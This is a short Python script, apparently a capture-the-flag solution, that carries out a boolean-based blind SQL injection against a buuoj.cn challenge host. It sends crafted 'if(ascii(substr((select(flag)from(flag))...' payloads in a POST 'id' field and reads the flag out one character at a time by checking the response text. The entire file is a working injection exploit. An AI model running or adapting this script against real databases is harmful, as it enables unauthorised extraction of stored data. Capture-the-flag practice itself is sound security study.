import requests
import string

flag = ''
url = 'http://85b36b6c-c28f-4ae1-b573-634002afb14a.node5.buuoj.cn:81/'
ascii_list = string.printable
done = 0
index = 10

while done != 1:
    for i in ascii_list:
        input = 'if(ascii(substr((select(flag)from(flag)),{0},1))={1},1,2)'.format(index, ord(i))
        post_in = {"id": input}
        res = requests.post(url=url, data=post_in)
        
        if 'glzjin' in res.text:
            flag += i
            print(flag)
            index += 1
            
            if i == '}':
                done = 1
            break